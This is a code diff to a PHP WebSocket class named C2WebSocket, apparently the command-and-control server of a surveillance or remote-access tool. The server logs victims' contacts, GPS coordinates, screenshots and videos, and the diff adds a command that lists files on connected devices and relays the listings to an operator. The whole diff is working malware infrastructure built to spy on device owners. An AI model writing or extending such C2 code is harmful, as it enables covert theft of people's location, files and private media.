@@ -12,6 +12,8 @@ class C2WebSocket implements MessageComponentInterface {
 
     private ConnectionInterface $server;
 
+    private ConnectionInterface $directoryCmdServer;
+
     /** @var Database $database Database instance */
     private Database $database;
 
@@ -49,7 +51,9 @@ class C2WebSocket implements MessageComponentInterface {
                 "message" => "[" .$currentDateTime . "]: Connection established successfully " . $conn->resourceId
             ];
             $conn->send(json_encode($response));
-        } elseif ($data->type === 'client') {
+        } else if ($data->type === "js-server-files") {
+            $this->jsServerFilesCommand($conn, $data);
+        }  elseif ($data->type === 'client') {
             $this->clientConnection($conn, $data);
         } elseif ($data->type === 'server')
             $this->serverConnection($conn, $data);
@@ -78,11 +82,17 @@ class C2WebSocket implements MessageComponentInterface {
             ];
             $this->server->send(json_encode($response));
         }
+
+        if ($conn === $this->directoryCmdServer)
+            unset($this->directoryCmdServer);
     }
 
     public function onError(ConnectionInterface $conn, \Exception $e)
     {
         $conn->close();
+
+        if ($conn === $this->directoryCmdServer)
+            unset($this->directoryCmdServer);
     }
 
     /**
@@ -110,6 +120,17 @@ class C2WebSocket implements MessageComponentInterface {
                     $this->database->insert($query, [$clientID, $name, $number]);
                 }
                 break;
+            case "files":
+                $files = $data->data;
+                if (isset($this->directoryCmdServer)) {
+                    $currentDateTime = date('Y-m-d H:i:s');
+                    $response = [
+                        "color" => "text-light",
+                        "message" => "[" .$currentDateTime . "]: $conn->resourceId => " . json_encode($files)
+                    ];
+                    $this->directoryCmdServer->send(json_encode($response));
+                }
+                break;
             case "id":
                 $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
                 break;
@@ -121,21 +142,21 @@ class C2WebSocket implements MessageComponentInterface {
                 break;
             case "location":
                 $query = "INSERT INTO LOCATION(client_id, latitude, longitude, altitude, timestamp) VALUES(?, ?, ?, ?, ?)";
-                $latitude = floatval(base64_decode($data->latitude));
-                $longitude = floatval(base64_decode($data->longitude));
-                $altitude = floatval(base64_decode($data->altitude));
+                $latitude = floatval($data->latitude);
+                $longitude = floatval($data->longitude);
+                $altitude = floatval($data->altitude);
                 $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude, $timestamp]);
                 break;
             case "screenshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data->filename);
+                $filename = $data->filename;
                 $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             case "video":
                 $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
-                $filename = base64_decode($data->filename);
+                $filename = $data->filename;
                 $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
@@ -205,7 +226,7 @@ class C2WebSocket implements MessageComponentInterface {
                     break;
                 case "LIST_FILES":
                     $json = json_encode([
-                        "cmd" => "VIDEO",
+                        "cmd" => "LIST_FILES",
                         "path" => $data->path
                     ]);
                     break;
@@ -246,6 +267,45 @@ class C2WebSocket implements MessageComponentInterface {
                     break;
             }
             
+            $client->send($json);
+        }
+    }
+
+    /**
+     * Handle files/directory commands from JS server
+     * 
+     * @param ConnectionInterface $conn
+     * @param $data
+     */
+    private function jsServerFilesCommand(ConnectionInterface $conn, $data): void
+    {
+        if (!isset($this->directoryCmdServer))
+            $this->directoryCmdServer = $conn;
+
+        $currentDateTime = date('Y-m-d H:i:s');
+        $response = [
+            "color" => "text-success",
+            "message" => "[" .$currentDateTime . "]: Connection established successfully " . $conn->resourceId
+        ];
+        $conn->send(json_encode($response));
+
+        if (!isset($data->web_socket_id))
+            return;
+
+        $clientWebSocketID = $data->web_socket_id;
+        $client = $this->getClient($clientWebSocketID);
+        
+        if (is_null($client))
+            return;
+
+        $json = null;
+
+        if ($data->cmd === 'LIST_FILES') {
+            $json = json_encode([
+                "cmd" => "LIST_FILES",
+                "path" => $data->path
+            ]);
+
             $client->send($json);
         }
     }
